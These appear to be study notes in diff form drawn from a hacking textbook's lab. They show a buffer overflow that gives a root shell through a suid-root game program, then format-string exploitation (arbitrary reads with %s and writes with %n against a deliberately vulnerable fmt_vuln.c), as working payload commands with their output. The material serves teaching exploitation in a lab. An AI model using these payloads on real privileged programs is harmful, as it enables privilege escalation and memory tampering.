+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
+[You have 130 credits] ->
+Change user name
+Enter your new name: Your name has been changed.
+-=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
+[You have 130 credits] ->
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 230 credits
+Would you like to play again? (y/n)
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 330 credits
+Would you like to play again? (y/n)
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 430 credits
+Would you like to play again? (y/n)
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 530 credits
+Would you like to play again? (y/n)
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 630 credits
+Would you like to play again? (y/n)
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 730 credits
+Would you like to play again? (y/n)
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 830 credits
+Would you like to play again? (y/n)
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 930 credits
+Would you like to play again? (y/n)
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 1030 credits
+Would you like to play again? (y/n)
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 1130 credits
+Would you like to play again? (y/n)
+[DEBUG] current_game pointer @ 0x08048d70
+*+*+*+*+*+* JACKPOT *+*+*+*+*+*
+You have won the jackpot of 100 credits!
+You now have 1230 credits
+Would you like to play again? (y/n) -=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
+[You have 1230 credits] ->
+Change user name
+Enter your new name: Your name has been changed.
+-=[
+1 -
+2 -
+3 -
+4 -
+5 -
+6 -
+7 -
+Game of Chance Menu ]=-
+Play the Pick a Number game
+Play the No Match Dealer game
+Play the Find the Ace game
+View current high score
+Change your user name
+Reset your account at 100 credits
+Quit
+[Name: Jon Erickson]
+[You have 1230 credits] ->
+Thanks for playing! Bye.
+reader@hacking:~/booksrc $
+
+************************************
+
+As you may have noticed, this program also runs suid root. 
+
+This means that shelcode can be used to do a lot more than win free credit. 
+
+Shell code can be stashed in an environment variable. 
+
+After building a suitable xploit buffer, the buffer is piped to the game_oc_chance's standard input. Notice the dash argument following the explooit buffer in the cat command. This tells the cat program to send standard input after the xploit buffer, returning control of the input. 
+
+Even though the root shell doesn't display its prompt, it is still accessible and still escalates privileges. 
+
+reader@hacking:~/booksrc $ export SHELLCODE=$(cat ./shellcode.bin)
+reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./game_of_chance
+SHELLCODE will be at 0xbffff9e0
+reader@hacking:~/booksrc $ perl -e 'print "1\n7\nn\n5\n" . "A"x100 . "\xe0\
+xf9\xff\xbf\n" . "1\n"' > exploit_buffer
+reader@hacking:~/booksrc $ cat exploit_buffer - | ./game_of_chance
+-=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: Jon Erickson]
+[You have 70 credits] ->
+[DEBUG] current_game pointer @ 0x08048fde
+####### Pick a Number ######
+This game costs 10 credits to play. Simply pick a number
+between 1 and 20, and if you pick the winning number, you
+will win the jackpot of 100 credits!
+10 credits have been deducted from your account.
+Pick a number between 1 and 20: The winning number is 2
+Sorry, you didn't win.
+You now have 60 credits
+Would you like to play again? (y/n) -=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: Jon Erickson]
+[You have 60 credits] ->
+Change user name
+Enter your new name: Your name has been changed.
+-=[ Game of Chance Menu ]=-
+1 - Play the Pick a Number game
+2 - Play the No Match Dealer game
+3 - Play the Find the Ace game
+4 - View current high score
+5 - Change your user name
+6 - Reset your account at 100 credits
+7 - Quit
+[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAp?]
+[You have 60 credits] ->
+[DEBUG] current_game pointer @ 0xbffff9e0
+whoami
+root
+id
+uid=0(root) gid=999(reader)
+groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(
+plugdev),104(scanner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(re
+
+FORMAT STRINGS
+
+Format String Exploit - another technique that can be used to gain control of a privileged program. Also depend on programming mistakes that may not appear to have an obvious ipact on security. 
+
+Once the technique is known, it's fairly easy to sport format string vulnerabilities and eliminate them. Although these vulnerabilites are not very common anymore, the following techinques can be used in other situations
+
+Format Parameters
+
+A function that uses format strings, such as printf() simply evaluates the format string passed to it and performs a special action aeach time a format parameter is encountered. 
+
+Each format parameter expects an additional variable to be passed, so if there are 3 format parameters in a format string, there should be 3 more arguments to the function (in addition to the format string argument). 
+
+fmt_uncommon.c -> demonstrates the %n format string
+
+#include <stdio.h>
+#include <stdlib.h>
+int main() {
+int A = 5, B = 7, count_one, count_two;
+// Example of a %n format string
+printf("The number of bytes written up to this point X%n is being stored in
+count_one, and the number of bytes up to here X%n is being stored in
+count_two.\n", &count_one, &count_two);
+printf("count_one: %d\n", count_one);
+printf("count_two: %d\n", count_two);
+// Stack example
+printf("A is %d and is at %08x.
+B is %x.\n", A, &A, B);
+exit(0);
+}
+
+%n -> write the number of bytes written so far in a format string to a specified argument. 
+
+reader@hacking:~/booksrc $ gcc fmt_uncommon.c
+reader@hacking:~/booksrc $ ./a.out
+The number of bytes written up to this point X is being stored in count_one, and the number of
+bytes up to here X is being stored in count_two.
+count_one: 46
+count_two: 113
+A is 5 and is at bffff7f4. B is 7.
+reader@hacking:~/booksrc $
+
+%n is unique in that it writes data without displaying anyhting. When a format function encounters a %n, it writes the number of bytes that have been written by the function to the address in the corresponding function's argument. 
+
+Stack example at the end is a convenient seque into an explanation of the stack's role with format strings
+
+printf("A is %d and is at %08x. B is %x.\n", A, &A, B);
+
+When this printf() function is called (as with any function), the arguments are pushed to the stack in reverse order. 
+
+First the value B, then address of A, then value of A, and finally the address of the format string. 
+
+Top of the Stack
+-------------------------
+|Address of format string|
+-------------------------
+|Value of a				 |
+-------------------------
+|Address of A			 |
+-------------------------
+| Value of B			 |
+-------------------------
+| Bottom of the Stack	 |
+
+
+But what if two arguments are pushed to the stack with a format string that uses 3 format parameters
+
+printf("A is %d and is at %08x. B is %x.\n", A, &A)
+
+Can be done in an editor or with sed
+
+reader@hacking:~/booksrc $ sed -e 's/, B)/)/' fmt_uncommon.c > fmt_uncommon2.c
+reader@hacking:~/booksrc $ diff fmt_uncommon.c fmt_uncommon2.c
+14c14
+<
+printf("A is %d and is at %08x. B is %x.\n", A, &A, B);
+---
+>
+printf("A is %d and is at %08x. B is %x.\n", A, &A);
+reader@hacking:~/booksrc $ gcc fmt_uncommon2.c
+reader@hacking:~/booksrc $ ./a.out
+The number of bytes written up to this point X is being stored in count_one, and the number of
+bytes up to here X is being stored in count_two.
+count_one: 46
+count_two: 113
+A is 5 and is at bffffc24. B is b7fd6ff4.
+reader@hacking:~/booksrc $
+
+The result is b7fd6ff4
+
+Turns out that since there wasn't a value pushed to the stack, the format function just pulled data from where the 3rd argument should have been (by adding to the current frame pointer). 
+
+Means b7fd6ff4 is the first value found below the stack frame for the format function. 
+
+Would be a lot more useful if there were a way to control either the number of arguments passed to or expected by a format function. Luckily, there is a fairly common programming mistake that allows for the latter. 
+
+The Format String Vulnerability
+
+Sometimes, programmers user printf(string) instead of printf("%s", string) to print strings. 
+
+Functionally, this works fine. Format functoin is passed the address of the string as opposed to the address of a format string, and it iterates through the string, printing each character. 
+
+fmt_vuln.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+char text[1024];
+static int test_val = -72;
+if(argc < 2) {
+printf("Usage: %s <text to print>\n", argv[0]);
+exit(0);
+}
+strcpy(text, argv[1]);
+printf("The right way to print user-controlled input:\n");
+printf("%s", text);
+printf("\nThe wrong way to print user-controlled input:\n");
+printf(text);
+printf("\n");
+// Debug output
+printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val,
+test_val);
+exit(0);
+}
+
+*************************
+Following output shows the compilation and execution
+*************************
+
+reader@hacking:~/booksrc $ gcc -o fmt_vuln fmt_vuln.c
+reader@hacking:~/booksrc $ sudo chown root:root ./fmt_vuln
+reader@hacking:~/booksrc $ sudo chmod u+s ./fmt_vuln
+reader@hacking:~/booksrc $ ./fmt_vuln testing
+The right way to print user-controlled input:
+testing
+The wrong way to print user-controlled input:
+testing
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+reader@hacking:~/booksrc $
+
+Both methods seem o work with string "testing"
+
+But what happens if string contains a format parameter?
+
+Format function should try to evaluate the format paramter and access the appropriate function argument by adding to the frame pointer. 
+
+But as we saw, if the appropriate function argument isn't there, adding to the frame pointer will reference a piece of memory in a preceding stack frame. 
+
+reader@hacking:~/booksrc $ ./fmt_vuln testing%x
+The right way to print user-controlled input:
+testing%x
+The wrong way to print user-controlled input:
+testingbffff3e0
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+reader@hacking:~/booksrc $
+
+When the %x format parameter was used, the hex representation of a 4 byte word in the stack was printed. Process can be used repeatedly to examine stack memory.
+
+reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "%08x."x40')
+The right way to print user-controlled input:
+%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.
+%08x.%08x.
+The wrong way to print user-controlled input:
+bffff320.b7fe75fc.00000000.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252
+e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.2
+52e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e78
+38.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+reader@hacking:~/booksrc $
+
+This shows what lower stack memory looks like. Remember each 4 byte word is backward, due to little-endian architecture. 
+
+Bytes 0x25, 0x30, 0x38, 0x78 are repeating a lot
+
+reader@hacking:~/booksrc $ printf "\x25\x30\x38\x78\x2e\n"
+%08x.
+reader@hacking:~/booksrc $
+
+As can see, they're the memory for the format string itself. Because the format function will always be onthe highest stack frame, as long as the format string has been stored anywhere on the stack, it will be located below the current frame pointer (at a higher memory address). 
+
+This can be used to control arguments to the format function. It is particularly useful if format parameters that pass by ereference are used, such as %s or %n
+
+Reading From Arbitrary Memory Addresses
+
+The %s format parameter can be used to read from arbitrary memory addresses. 
+
+Since it's possible to read the data of the original format string, part of the original format string can be used to supply an address to the $s format parameter
+
+reader@hacking:~/booksrc $ ./fmt_vuln AAAA%08x.%08x.%08x.%08x
+The right way to print user-controlled input:
+AAAA%08x.%08x.%08x.%08x
+The wrong way to print user-controlled input:
+AAAAbffff3d0.b7fe75fc.00000000.41414141
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+reader@hacking:~/booksrc $
+
+The 4 bytes of 0x41 indicate  that the 4th parameter is reading from the beginning of the format string to gets it data. 
+
+If the 4th format parameter is %s instead of %x, the format function will attempt to print the string located at 0x41414141
+
+This will cause the program to crash in a segmentation fault, since this isn't a valid address. If a valid memory address i sused, this process could be used to read a string found at that memory address
+
+reader@hacking:~/booksrc $ env | grep PATH
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+reader@hacking:~/booksrc $ ./getenvaddr PATH ./fmt_vuln
+PATH will be at 0xbffffdd7
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\xd7\xfd\xff\xbf")%08x.%08x.%08x.%s
+The right way to print user-controlled input:
+????%08x.%08x.%08x.%s
+The wrong way to print user-controlled input:
+????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/
+usr/games
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+reader@hacking:~/booksrc $
+
+Here the getenvaddr program is used to get the address for the environment variable PATH. 
+
+Since the program name fmt_vuln is 2 bytes less than getenvaddr, 4 is added to the address, and the bytes are reversed due to the byte ordering. 
+
+4th format parameter is %s reads from the beginning of the format string, thinking it's the address that was passed as a function argument. Since this address is the address of the PATH environment variable, it is printed as if a pointer to the environment variable were passed to printf(). 
+
+Now that distance between the end of the stack frame and the beginning of the format string memory is known, the field-width argument can be omitted in the %x format parameters. These format parameters are only needed to step through memory. 
+
+Using this technique, any memory address can be examined as a string
+
+Writing To Abitrary Memory Addresses
+
+If %s format parameter can be used to read an arbitrary memory address, you should be able to use the same technique with %n to write to an arbitrary memory address
+
+The test_val variable has been printing its address and value in the debug statement of the vulnerable fmt_vuln.c program, just begging to be overwritten. The test variable is located at 0x08049794 so by using a similar technique, you should be able to write to the variable
+
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\xd7\xfd\xff\xbf")%08x.%08x.%08x.%s
+The right way to print user-controlled input:
+????%08x.%08x.%08x.%s
+The wrong way to print user-controlled input:
+????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/
+usr/games
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%08x.%08x.%08x.%n
+The right way to print user-controlled input:
+??%08x.%08x.%08x.%n
+The wrong way to print user-controlled input:
+??bffff3d0.b7fe75fc.00000000.
+[*] test_val @ 0x08049794 = 31 0x0000001f
+reader@hacking:~/booksrc $
+
+As this shows, the test_val can indded be overwritten using the %n format parameter. 
+
+Resulting value in the test variable depends on the number of bytes written before the %n.
+
+This can be controlled to a greater degree by manipulating the field width option
+
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%x%n
+The right way to print user-controlled input:
+??%x%x%x%n
+The wrong way to print user-controlled input:
+??bffff3d0b7fe75fc0
+[*] test_val @ 0x08049794 = 21 0x00000015
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%100x%n
+The right way to print user-controlled input:
+??%x%x%100x%n
+The wrong way to print user-controlled input:
+??bffff3d0b7fe75fc
+0
+[*] test_val @ 0x08049794 = 120 0x00000078
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%180x%n
+The right way to print user-controlled input:
+??%x%x%180x%n
+The wrong way to print user-controlled input:
+??bffff3d0b7fe75fc
+0
+[*] test_val @ 0x08049794 = 200 0x000000c8
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%400x%n
+The right way to print user-controlled input:
+??%x%x%400x%n
+The wrong way to print user-controlled input:
+??bffff3d0b7fe75fc
+0
+[*] test_val @ 0x08049794 = 420 0x000001a4
+reader@hacking:~/booksrc $
+
+By manipulating the field-width option of one of the format paramters before the %n, a certain number of blank spaces can be inserted, resulting in the output having some blank lines. 
+
+These lines can in turn be used to control the number of bytes written before the %n format parameter. 
+
+This approach will work for small numbers, but it won't work for larger ones, like memory addresses. 
+
+Least significant bytes can be controlled fairly well. If 4 writes are done at sequential memory addresses, the least significant bye can be written to each byte of a 4 byte word
+
+Memory							94 95 96 97
+First write to 0x08049794		AA 00 00 00
+Second write to 0x08049795		   BB 00 00 00
+Third write to 0x08049796		      CC 00 00 00
+Fourth write to 0x08049797			     DD 00 00 00
+Result							AA BB CC DD
+
+In memory, try to write address 0xDDCCBBAA into test variable
+
+In memory, the first byte of the test variable should be 0xAA , then 0xBB , then 0xCC , and finally 0xDD . Four separate writes to the memory addresses 0x08049794 , 0x08049795 , 0x08049796 , and 0x08049797 should accomplish this. The first write will write the value 0x000000aa , the second 0x000000bb , the third 0x000000cc , and finally 0x000000dd .
+
+First write should be easy
+
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%8x%n
+The right way to print user-controlled input:
+??%x%x%8x%n
+The wrong way to print user-controlled input:
+??bffff3d0b7fe75fc
+0
+[*] test_val @ 0x08049794 = 28 0x0000001c
+reader@hacking:~/booksrc $ gdb -q
+(gdb) p 0xaa - 28 + 8
+$1 = 150
+(gdb) quit
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%150x%n
+The right way to print user-controlled input:
+??%x%x%150x%n
+The wrong way to print user-controlled input:
+??bffff3d0b7fe75fc
+0
+[*] test_val @ 0x08049794 = 170 0x000000aa
+reader@hacking:~/booksrc $
+
+The last %x format parameter uses 8 as the field width to standardize the output. Essentially reading a random DWORD from the stack, which could output anywhere from 1 to 8 characters. 
+
+Since first overwrite puts 28 into test_val, using 150 as the field width instead of 8 should control the lealst significant byte of test_val to 0xAA.
+
+For next write, another argument is needed for another %x format parameter to increment the byte count to 187, which is 0xBB in decimal. 
+
+Argument can be anything. It just has to be 4 bytes long, and must be located aafter the first arbitrary memory address of 0x08049754
+
+Since this is all still in the memory of the format string, it can be esaily controlled. 
+
+Word "JUNK" is 4 bytes and works.
+
+Next memory address to be written to, 0x08049755, should be put into memory so second %n can access it
+
+Means the beginning of the format string should consist of the target memory address, 4 bytes of junk, and then the target memory address plus one. 
+
+But all these bytes of meomry are also printed by format function, incrementing the byte counter used for the %n paramter. Getting tricky. 
+
+Goals is to have 4 writes. Each one will need to have a memory address passed to it, and among them all, 4 bytes of junk are needed to properly increment the byte counter for the %n format parameters. 
+
+The first %x format parameter can use the 4 bytes found before the format string itself, but the remaining three will need to be supplied data. 
+
+Looks like this:
+94, 97, 04, 08, J, U, N, K, 95, 97, 04, 08, J, U, N, K, 96, 97, 04, 08, J, U, N, K, 97, 97, 04, 08
+0x08049794					0x08049795					0x08049796					08049797
+
+Addresses and junk data at beginning of ormat string changed value of necesssary field width option for the %x format parameter. 
+
+However, this can easily be recalculated using same method as before. Also could have subtracted 24 from previous field width value of 150 since 6 new 4byte words hav ebeen added to front of format string
+
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\
+x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%8x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%8x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
+0
+[*] test_val @ 0x08049794 = 52 0x00000034
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xaa - 52 + 8"
+$1 = 126
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\
+x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%126x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
+0
+[*] test_val @ 0x08049794 = 170 0x000000aa
+reader@hacking:~/booksrc $
+
+With all memory set up ahead of time in beginning of format string, the second write should be simple
+
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xbb - 0xaa"
+$1 = 17
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\
+x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n%17x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
+0
+4b4e554a
+[*] test_val @ 0x08049794 = 48042 0x0000bbaa
+reader@hacking:~/booksrc $
+
+Hx calculator shows that 17 more bytes need to be written before next %n format parameter. 
+
+Simple
+
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xcc - 0xbb"
+$1 = 17
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xdd - 0xcc"
+$1 = 17
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\
+x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n%17x%n%17x%n%17x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%126x%n%17x%n%17x%n%17x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
+0	4b4e554a	4b4e554a	4b4e554a
+[*] test_val @ 0x08049794 = -573785174 0xddccbbaa
+reader@hacking:~/booksrc $
+
+Should be noted that the three bytes found after target address will also be overwritten using this technique. Can be quickly explored by statically declaring another initialized variable called next_val right after test_val. 
+
+reader@hacking:~/booksrc $ sed -e 's/72;/72, next_val = 0x11111111;/;/@/{h;s/test/next/g;x;G}'
+fmt_vuln.c > fmt_vuln2.c
+reader@hacking:~/booksrc $ diff fmt_vuln.c fmt_vuln2.c
+7c7
+<
+static int test_val = -72;
+---
+> static int test_val = -72, next_val = 0x11111111;
+27a28
+> printf("[*] next_val @ 0x%08x = %d 0x%08x\n", &next_val, next_val, next_val);
+reader@hacking:~/booksrc $ gcc -o fmt_vuln2 fmt_vuln2.c
+reader@hacking:~/booksrc $ ./fmt_vuln2 test
+The right way:
+test
+The wrong way:
+test
+[*] test_val @ 0x080497b4 = -72 0xffffffb8
+[*] next_val @ 0x080497b8 = 286331153 0x11111111
+reader@hacking:~/booksrc $
+
+Last time, the address 0xddccbbaa was convenient since each byte is greater than previous. What if address was like 0x0806abcd?
+
+Can write 0xcd easily enough.
+
+But what about 0xab after? 
+
+Instead of trying to subtract 34 from 205, the least significant byte it just wrapped around to 0x1AB by adding 222 to 205 to produce 427, which is the decimal representation of 0x1AB
+
+Technique can be used to wrap around again and set the least significant bte to 0x06 for the third write. 
+
+reader@hacking:~/booksrc $ ./fmt_vuln2 AAAA%x%x%x%x
+The right way to print user-controlled input:
+AAAA%x%x%x%x
+The wrong way to print user-controlled input:
+AAAAbffff3d0b7fe75fc041414141
+[*] test_val @ 0x080497f4 = -72 0xffffffb8
+[*] next_val @ 0x080497f8 = 286331153 0x11111111
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xcd - 5"
+$1 = 200
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\
+x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%8x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%8x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
+0
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+reader@hacking:~/booksrc $
+reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\
+x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%8x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%8x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
+0
+[*] test_val @ 0x080497f4 = 52 0x00000034
+[*] next_val @ 0x080497f8 = 286331153 0x11111111
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xcd - 52 + 8"
+$1 = 161
+reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\
+x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%161x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
+0
+[*] test_val @ 0x080497f4 = 205 0x000000cd
+[*] next_val @ 0x080497f8 = 286331153 0x11111111
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0xab - 0xcd"
+$1 = -34
+reader@hacking:~/booksrc $
+
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x1ab - 0xcd"
+$1 = 222
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p /d 0x1ab"
+$1 = 427
+reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\
+x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
+0
+4b4e554a
+[*] test_val @ 0x080497f4 = 109517 0x0001abcd
+[*] next_val @ 0x080497f8 = 286331136 0x11111100
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x06 - 0xab"
+$1 = -165
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x106 - 0xab"
+$1 = 91
+reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\
+x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n%91x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3b0b7fe75fc
+0
+4b4e554a
+4b4e554a
+[*] test_val @ 0x080497f4 = 33991629 0x0206abcd
+[*] next_val @ 0x080497f8 = 286326784 0x11110000
+reader@hacking:~/booksrc $
+
+With each write, bytes of the next_val variable, adjacent to test_val, are being overwritten. 
+
+A slight problem manifests as final byte is attempted. 
+
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x08 - 0x06"
+$1 = 2
+reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\
+x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n%91x%n%2x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%2x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3a0b7fe75fc
+0
+4b4e554a
+4b4e554a4b4e554a
+[*] test_val @ 0x080497f4 = 235318221 0x0e06abcd
+[*] next_val @ 0x080497f8 = 285212674 0x11000002
+reader@hacking:~/booksrc $
+
+What happened?
+
+Difference between 0x06 and 0x08 is only two, but 8 bytes are output, resulting in byte 0x03. 
+
+This is because field width optio for %x is only a minimum field width, and 8 bytes of data were output. 
+
+Can be alleviated by again wrapping around. 
+
+reader@hacking:~/booksrc $ gdb -q --batch -ex "p 0x108 - 0x06"
+$1 = 258
+reader@hacking:~/booksrc $ ./fmt_vuln2 $(printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\
+x97\x04\x08JUNK\xf7\x97\x04\x08")%x%x%161x%n%222x%n%91x%n%258x%n
+The right way to print user-controlled input:
+??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%258x%n
+The wrong way to print user-controlled input:
+??JUNK??JUNK??JUNK??bffff3a0b7fe75fc
+0
+4b4e554a
+4b4e554a
+4b4e554a
+[*] test_val @ 0x080497f4 = 134654925 0x0806abcd
+[*] next_val @ 0x080497f8 = 285212675 0x11000003
+reader@hacking:~/booksrc $
+
+So just like before.
+
+Appropriate addresses and junk data are put in the beginning of the format string, and the least significant byte is controllde for four write operations to overwrite all four bytes of the varible test_val. ANy value subtractions to the least significant ybte can be accomplished by wrapping the byte around. Also any additions less than 8 may ned ot be wrapped around in a similar fashion
+
+DIRECT PARAMETER ACCESS
+
+Direct parameter access is way to simplify format string exploits. 
+
